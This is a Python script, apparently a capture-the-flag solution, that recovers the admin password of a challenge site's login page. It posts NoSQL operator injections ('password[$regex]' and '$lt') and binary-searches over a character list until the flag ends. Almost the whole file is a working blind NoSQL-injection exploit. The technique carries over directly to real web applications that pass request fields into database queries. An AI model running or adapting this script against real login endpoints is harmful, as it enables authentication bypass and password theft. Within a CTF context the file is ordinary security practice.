#!/usr/bin/env python
import requests

charList = ['!','#','%','&','(',')','-','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','{','}']

flag = 'TWCTF{' # is know when login as admin 


def check(guess,pd):
	if pd == "reg":
		payload = {'user': 'admin', 'password[$regex]': '^' + flag + guess }
	elif pd == "lt":
		payload = {'user': 'admin', 'password[$lt]': flag + guess }
	else:
		print "WTF!?"

	# Make the POST Request	
	r = requests.post('http://gap.chal.ctf.westerns.tokyo/login.php', data = payload)

    # Check Login Error
 	found = r.text.find("Wrong user name or password")

 	# Is login successfuly?
 	return found < 0
    	
# Binary for optimize the password recovery
def binarySearch(first,last):
	# Middle ineteger take flat
	middle = (first+last)//2
	
	# DB purpose
	#print "call: ",first,last,middle
	#print "Try guess: ", charList[middle]

	if check(charList[middle],"reg"):
		return charList[middle]
	elif  check(charList[middle],"lt"):
		return binarySearch(first,middle)
	else:
		return binarySearch(middle+1,last)

while True:
	char = binarySearch(0,len(charList)-1)
	
	flag += char
	print 'flag: ', flag

	# Flag end with }
	if char == "}":
		quit()